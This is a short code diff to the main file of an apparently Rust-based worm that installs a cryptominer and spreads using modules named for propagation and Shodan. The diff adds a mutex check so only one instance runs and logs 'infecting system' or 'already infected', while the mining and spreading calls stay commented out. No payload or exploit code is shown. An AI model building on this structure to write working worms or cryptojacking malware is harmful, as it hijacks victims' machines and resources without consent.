@@ -2,26 +2,41 @@ mod propogate;
 mod network;
 mod shodan;
 mod miner;
+mod mutex;
 
 use miner::Miner;
 
 use env_logger::{Builder, Env};
+use log::{info, warn};
 
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     Builder::from_env(Env::default().default_filter_or("info")).init();
 
-    /*
-    let miner = Miner::new();
+    match mutex::lock() {
+        Some(_) => {
+            info!("infecting system");
 
-    miner.install()?;
+            /*
+            let miner = Miner::new();
 
-    miner.enable_huge_pages();
+            miner.install()?;
 
-    miner.run()?;
-    */
+            miner.enable_huge_pages();
 
-    propogate::run()
+            miner.run()?;
+            */
+
+            // propogate::run()
+
+            loop {}
+        },
+        None => {
+            warn!("already infected");
+        },
+    }
+
+    Ok(())
 }
 
 
